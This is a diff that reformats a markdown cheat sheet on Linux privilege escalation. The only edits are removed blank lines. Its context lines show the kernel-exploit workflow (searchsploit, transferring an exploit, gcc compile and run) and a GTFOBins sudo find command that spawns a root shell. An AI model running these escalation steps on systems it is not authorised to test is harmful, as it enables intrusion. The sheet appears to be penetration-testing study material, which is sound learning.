@@ -65,23 +65,16 @@ chmod +x linpeas.sh && ./linpeas.sh
 ## 3️⃣ Kernel Exploits
 
 1. `uname -r` — get version
-    
 2. Search **CVE**, **searchsploit**, **Exploit-DB**
-    
     ```bash
     searchsploit Linux Kernel <version>
     ```
-    
 3. Transfer exploit: `wget`, `scp`, `python3 -m http.server`
-    
 4. Compile & run:
-    
     ```bash
     gcc exploit.c -o exploit && ./exploit
     ```
-    
 5. `whoami` → verify root
-    
 
 ⚠️ **Danger:** Kernel exploits can crash a box — use only when safe.
 
@@ -97,8 +90,7 @@ sudo -l
 
 🔑 **GTFOBins Tricks**
 
-- `find`:
-    
+- `find`:    
     ```bash
     sudo find . -exec /bin/sh \\; -quit
     ```
